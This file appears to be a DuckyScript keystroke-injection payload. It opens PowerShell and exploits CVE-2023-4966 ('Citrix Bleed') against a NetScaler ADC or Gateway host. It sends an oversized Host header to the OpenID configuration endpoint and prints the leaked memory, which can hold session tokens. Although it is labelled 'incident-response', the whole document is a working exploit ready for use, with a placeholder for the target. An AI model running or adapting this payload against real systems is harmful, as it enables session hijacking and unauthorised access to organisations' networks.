REM ##################################################################################
REM #                                                                                #
REM # Title       : Exploit Citrix NetScaler ADC and Gateway through CVE-2023-4966   #
REM # Author      : Aleff                                                            #
REM # Version	  : 1.0                                                              #
REM # Category	  : incident-response                                                #
REM # Target	  : Citrix NetScaler ADV; NetScaler Gateway                          #
REM #                                                                                #
REM ##################################################################################

REM Windows Version

DELAY 3000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000

STRING $header_value = 'a' * 24576
ENTER
DELAY 500
STRING $header_value = $header_value -replace "\n", ""
ENTER
DELAY 500

STRING $headers="-H 'Host:$header_value'"
ENTER
DELAY 500

STRING $headers = @{'Host' = $header_value}
ENTER
DELAY 500

REM Replace #HOSTNAME with your target, so put here the Citrix ADC / Gateway target, excluding the protocol (e.g. 192.168.1.200)
STRING $uri = "https://#HOSTNAME/oauth/idp/.well-known/openid-configuration"
ENTER
DELAY 500
STRING $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method GET -TimeoutSec 10
ENTER
DELAY 500

STRING if ($response.Substring(0, 3) -eq "200") {
ENTER
DELAY 500
STRING Write-Host "--- Dumped memory ---"
ENTER
DELAY 500
STRING $response.Substring(131050)  # 131051 - 1
ENTER
DELAY 500
STRING Write-Host "---      End      ---"
ENTER
DELAY 500
STRING } else {
ENTER
DELAY 500
STRING Write-Host "Could not dump memory"}
ENTER